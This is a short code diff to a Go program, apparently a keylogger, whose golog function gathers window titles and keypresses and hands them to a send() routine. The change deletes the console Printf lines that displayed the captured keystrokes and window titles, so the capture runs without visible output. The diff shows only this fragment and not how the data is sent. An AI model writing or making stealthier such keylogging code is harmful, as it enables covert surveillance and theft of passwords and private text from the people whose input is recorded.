@@ -3,7 +3,6 @@
 package main
 
 import (
-	"fmt"
 	"os"
 	"os/signal"
 	"syscall"
@@ -48,13 +47,11 @@ func golog(logbuffer int, windowLogGranularity int, keyLogGranularity int) {
 		// and send
 		if wi == 0 && !first {
 			kl := logKeyList(keypresses)
-			fmt.Printf(". %s\n", kl)
 			send(wl, len(wl), kl)
 		}
 
 		//Stick in next log position
 		wl[wi] = *(<-window_titles)
-		fmt.Printf("[%d] %s\n", wi, wl[wi])
 		wi++
 	}
 }
